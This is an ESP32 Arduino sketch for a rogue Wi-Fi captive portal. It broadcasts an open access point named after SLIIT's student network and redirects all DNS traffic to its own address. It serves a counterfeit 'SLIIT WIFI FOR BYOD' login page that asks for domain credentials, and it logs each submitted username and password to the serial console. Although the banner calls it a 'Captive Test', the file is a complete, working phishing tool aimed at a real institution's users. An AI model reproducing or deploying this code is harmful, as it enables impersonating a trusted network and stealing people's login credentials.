#include <Arduino.h>
#include <AsyncTCP.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <esp_wifi.h>
#include "FS.h"
#include "SPIFFS.h"

const char *ssid = "SLIIT-STD";
const char *password = NULL;

#define MAX_CLIENTS 4
#define WIFI_CHANNEL 6

const IPAddress localIP(4, 3, 2, 1);
const IPAddress gatewayIP(4, 3, 2, 1);
const IPAddress subnetMask(255, 255, 255, 0);

const String localIPURL = "http://4.3.2.1";

const char index_html[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=8; IE=EDGE">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style type="text/css">
    body { height: 100%; font-family: Helvetica, Arial, sans-serif; color: #6a6a6a; margin: 0; display: flex; align-items: center; justify-content: center; }
    input[type=date], input[type=email], input[type=number], input[type=password], input[type=search], input[type=tel], input[type=text], input[type=time], input[type=url], select, textarea { color: #262626; vertical-align: baseline; margin: .2em; border-style: solid; border-width: 1px; border-color: #a9a9a9; background-color: #fff; box-sizing: border-box; padding: 2px .5em; appearance: none; border-radius: 0; }
    input:focus { border-color: #646464; box-shadow: 0 0 1px 0 #a2a2a2; outline: 0; }
    button { padding: .5em 1em; border: 1px solid; border-radius: 3px; min-width: 6em; font-weight: 400; font-size: .8em; cursor: pointer; }
    button.primary { color: #fff; background-color: rgb(47, 113, 178); border-color: rgb(34, 103, 173); }
    .message-container { height: 500px; width: 600px; padding: 0; margin: 12% 10px 10px 10px; }
    .logo { background: url(/logo.png) no-repeat left center; height: 80px; object-fit: contain; }
    table { background-color: #fff; border-spacing: 0; margin: 1em; }
    table > tbody > tr > td:first-of-type:not([colspan]) { white-space: nowrap; color: rgba(0,0,0,.5); }
    table > tbody > tr > td:first-of-type { vertical-align: top; }
    table > tbody > tr > td { padding: .3em .3em; }
    .field { display: table-row; }
    .field > :first-child { display: table-cell; width: 20%; }
    .field.single > :first-child { display: inline; }
    .field > :not(:first-child) { width: auto; max-width: 100%; display: inline-flex; align-items: baseline; virtical-align: top; box-sizing: border-box; margin: .3em; }
    .field > :not(:first-child) > input { width: 230px; }
    .form-footer { display: flex; justify-content: flex-start; padding-left:70px; }
    .form-footer > * { margin: 1em; }
    .text-scrollable { overflow: auto; height: 150px; border: 1px solid rgb(200, 200, 200); padding: 5px; font-size: 1em; }
    .text-centered { text-align: center; }
    .text-container { margin: 1em 1.5em; }
    .flex-container { display: flex; }
    .flex-container.column { flex-direction: column; }
  </style>
  <title>User Authentication</title>
</head>
<body>
  <div class="message-container">
    <div class="logo"> </div>
    <h1>SLIIT WIFI FOR BYOD</h1>
    <h2>Authentication Required</h2>
    <form action="/submit" method="post">
      <input type="hidden" name="4Tredir" value="http://edge-http.microsoft.com/captiveportal/generate_204">
      <input type="hidden" name="magic" value="040c4dd00cf4fb7b">
      <p style="display:none;">Please enter your username and password to continue.</p>
      <p>Please enter your SLIIT domain credential to continue.</p>
      <div class="field">
        <label for="ft_un">Username</label>
        <div> <input name="username" id="ft_un" type="text" autocorrect="off" autocapitalize="off"> </div>
      </div>
      <div class="field">
        <label for="ft_pd">Password</label>
        <div> <input name="password" id="ft_pd" type="password" autocomplete="off"> </div>
      </div>
      <div class="form-footer">
        <button class="primary" type="submit">Continue</button>
      </div>
    </form>
  </div>
</body>
</html>
)=====";

DNSServer dnsServer;
AsyncWebServer server(80);

void setUpDNSServer(DNSServer &dnsServer, const IPAddress &localIP)
{
#define DNS_INTERVAL 30
  dnsServer.setTTL(3600);
  dnsServer.start(53, "*", localIP);
}

void startSoftAccessPoint(const char *ssid, const char *password, const IPAddress &localIP, const IPAddress &gatewayIP)
{
#define MAX_CLIENTS 4
#define WIFI_CHANNEL 6
  WiFi.mode(WIFI_MODE_AP);
  const IPAddress subnetMask(255, 255, 255, 0);
  WiFi.softAPConfig(localIP, gatewayIP, subnetMask);
  WiFi.softAP(ssid, password, WIFI_CHANNEL, 0, MAX_CLIENTS);
  esp_wifi_stop();
  esp_wifi_deinit();
  wifi_init_config_t my_config = WIFI_INIT_CONFIG_DEFAULT();
  my_config.ampdu_rx_enable = false;
  esp_wifi_init(&my_config);
  esp_wifi_start();
  vTaskDelay(100 / portTICK_PERIOD_MS);
}

void setUpWebserver(AsyncWebServer &server, const IPAddress &localIP)
{
  // Handle the root page
  server.on("/", HTTP_ANY, [](AsyncWebServerRequest *request)
            {
    AsyncWebServerResponse *response = request->beginResponse(200, "text/html", index_html);
    response->addHeader("Cache-Control", "public,max-age=31536000");
    request->send(response); });

  server.on("/logo.png", HTTP_GET, [](AsyncWebServerRequest *request)
            { request->send(SPIFFS, "/logo.png", "image/png"); });

  // Handle form submission (POST request)
  server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request)
            {
    String username;
    String password;

    // Get username and password from form data
    if (request->hasParam("username", true)) {
      username = request->getParam("username", true)->value();
    }
    if (request->hasParam("password", true)) {
      password = request->getParam("password", true)->value();
    }

    // Print the credentials to the Serial Monitor
    Serial.println("Submitted Credentials:");
    Serial.print("Username: ");
    Serial.println(username);
    Serial.print("Password: ");
    Serial.println(password);

    // Respond back to the client
    request->send(200, "text/html", "success"); });

  // Handle 404 errors (page not found)
  server.onNotFound([](AsyncWebServerRequest *request)
                    { request->redirect(localIPURL); });
}

void setup()
{

  Serial.setTxBufferSize(1024);
  Serial.begin(115200);

  while (!Serial)
    ;

  if (!SPIFFS.begin(true))
  { // true = format SPIFFS if mount fails
    Serial.println("SPIFFS Mount Failed!");
    return;
  }

  Serial.println("SPIFFS Mounted Successfully!");

  File root = SPIFFS.open("/");
  if (!root || !root.isDirectory())
  {
    Serial.println("Failed to open directory");
    return;
  }

  Serial.println("Files in SPIFFS:");
  File file = root.openNextFile();
  while (file)
  {
    Serial.printf("FILE: %s SIZE: %d bytes\n", file.name(), file.size());
    file = root.openNextFile();
  }

  Serial.println("\n\nCaptive Test, V0.5.0 compiled " __DATE__ " " __TIME__ " by CD_FER");
  Serial.printf("%s-%d\n\r", ESP.getChipModel(), ESP.getChipRevision());

  startSoftAccessPoint(ssid, password, localIP, gatewayIP);
  setUpDNSServer(dnsServer, localIP);
  setUpWebserver(server, localIP);
  server.begin();

  Serial.print("\n");
  Serial.print("Startup Time:");
  Serial.println(millis());
  Serial.print("\n");
}

void loop()
{
  dnsServer.processNextRequest();
  delay(DNS_INTERVAL);
}
